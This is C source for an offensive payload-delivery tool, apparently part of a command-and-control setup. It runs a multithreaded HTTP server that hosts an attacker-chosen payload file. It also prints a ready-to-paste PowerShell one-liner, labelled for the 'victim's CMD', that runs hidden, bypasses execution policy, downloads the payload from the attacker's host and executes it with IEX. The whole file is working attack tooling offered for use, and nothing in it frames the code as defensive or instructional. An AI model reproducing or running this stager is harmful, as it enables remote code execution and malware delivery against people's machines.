#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>

char C2_IP[32];
int C2_PORT;
char PAYLOAD[256];

void *handle_client(void *client_sock_ptr) {
    int client_sock = *(int *)client_sock_ptr;
    free(client_sock_ptr);

    char buffer[4096];
    FILE *payload_file = fopen(PAYLOAD, "r");
    if (!payload_file) {
        perror("[-] Failed to open payload file");
        close(client_sock);
        return NULL;
    }
    
    fseek(payload_file, 0, SEEK_END);
    long payload_size = ftell(payload_file);
    rewind(payload_file);
    
    char http_response[512];
    snprintf(http_response, sizeof(http_response),
             "HTTP/1.1 200 OK\r\n"
             "Content-Type: text/plain\r\n"
             "Content-Length: %ld\r\n"
             "Connection: keep-alive\r\n\r\n", payload_size);
    send(client_sock, http_response, strlen(http_response), 0);
    
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), payload_file)) > 0) {
        if (send(client_sock, buffer, bytes_read, 0) < 0) {
            perror("[-] Send failed");
            break;
        }
    }
    fclose(payload_file);
    return NULL;
}

void *host_payload(void *arg) {
    int server_sock, *client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size;

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock == -1) {
        perror("[-] Payload server socket creation failed");
        return NULL;
    }

    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(C2_PORT);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Bind failed");
        close(server_sock);
        return NULL;
    }

    if (listen(server_sock, 10) < 0) {
        perror("[-] Listen failed");
        close(server_sock);
        return NULL;
    }

    printf("[+] Hosting payload at: http://%s:%d/%s\n", C2_IP, C2_PORT, PAYLOAD);

    while (1) {
        addr_size = sizeof(client_addr);
        client_sock = malloc(sizeof(int));
        if (!client_sock) {
            perror("[-] Memory allocation failed");
            continue;
        }
        *client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_size);
        if (*client_sock < 0) {
            perror("[-] Payload connection failed");
            free(client_sock);
            continue;
        }

        pthread_t client_thread;
        pthread_create(&client_thread, NULL, handle_client, client_sock);
        pthread_detach(client_thread);
    }
    close(server_sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <port> <payload to host>\n", argv[0]);
        return 1;
    }

    strncpy(C2_IP, argv[1], sizeof(C2_IP) - 1);
    C2_IP[sizeof(C2_IP) - 1] = '\0';
    C2_PORT = atoi(argv[2]);
    strncpy(PAYLOAD, argv[3], sizeof(PAYLOAD) - 1);
    PAYLOAD[sizeof(PAYLOAD) - 1] = '\0';

    printf("\n\033[1;33m[+] Commands to execute on the victim's CMD:\033[0m\n");
    printf("\033[38;5;246m");
    printf("powershell.exe -exec bypass -nop -w hidden -c \"IEX (Invoke-WebRequest -UseBasicParsing -Uri 'http://%s:%d/%s').Content\"\n", C2_IP, C2_PORT, PAYLOAD);
    printf("\033[0m\n");

    pthread_t payload_thread;
    pthread_create(&payload_thread, NULL, host_payload, NULL);
    pthread_join(payload_thread, NULL);
    return 0;
}
